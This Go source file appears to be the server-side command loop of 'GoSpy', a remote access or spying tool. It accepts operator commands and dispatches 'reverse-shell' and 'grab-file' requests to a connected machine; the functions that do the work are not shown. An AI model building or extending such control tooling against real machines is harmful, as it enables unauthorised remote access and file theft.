package serverprompt

import (
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/psidex/GoSpy/internal/commands"
	"github.com/psidex/GoSpy/internal/server/conman"
	"io"
	"net"
	"os"
	"strings"
)

// CommandLoop is the loop that receives commands and executes them.
// This should only return an err has occurred and it is impossible to continue as is (i.e. network dropped).
func CommandLoop(man conman.ConMan) (err error) {
	for {
		in := prompt.Input("> ", Completer)
		in = strings.TrimSpace(in)
		blocks := strings.Split(in, " ")

		switch blocks[0] {

		case "exit":
			_ = commands.ExitSend(man.CmdCon)
			os.Exit(0)

		case "ping":
			err = commands.PingSend(man.CmdCon)

		case "reverse-shell":
			err = commands.ReverseShellSend(man)

		case "grab-file":
			// ToDo: Validate command (e.g. are there 2 paths supplied?)
			// ToDo: How to support file path with spaces in?
			// ToDo: Allow user to specify non-encrypted connection if using encrypted con.
			err = commands.GrabFileSend(man, blocks[1], blocks[2])

		}

		if _, isNetErr := err.(net.Error); isNetErr == true || err == io.EOF {
			break
		}
		if err != nil {
			fmt.Printf("Command error: %s\n", err.Error())
		}
	}
	return err
}
